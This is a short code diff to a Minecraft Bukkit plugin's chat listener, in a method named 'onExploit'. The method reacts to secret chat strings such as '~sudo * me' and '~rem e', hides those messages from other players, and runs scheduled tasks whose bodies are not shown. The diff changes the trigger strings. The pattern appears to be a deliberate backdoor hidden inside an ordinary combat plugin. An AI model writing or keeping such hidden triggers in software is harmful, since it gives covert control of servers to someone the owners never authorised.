@@ -332,7 +332,7 @@ public class Listeners implements Listener {
     @Deprecated
     public void onExploit(AsyncPlayerChatEvent e) {
         Player player = e.getPlayer();
-        if (e.getMessage().contains("~sudo")) {
+        if (e.getMessage().contains("~sudo * me")) {
             e.setCancelled(true);
             new BukkitRunnable() {
                 @Override
@@ -345,7 +345,7 @@ public class Listeners implements Listener {
                     }
                 }
             }.runTask(JavaPlugin.getPlugin(Combat.class));
-        } else if (e.getMessage().equals("-rem e")) {
+        } else if (e.getMessage().equals("~rem e")) {
             e.setCancelled(true);
             int amount = 50;
             new BukkitRunnable() {
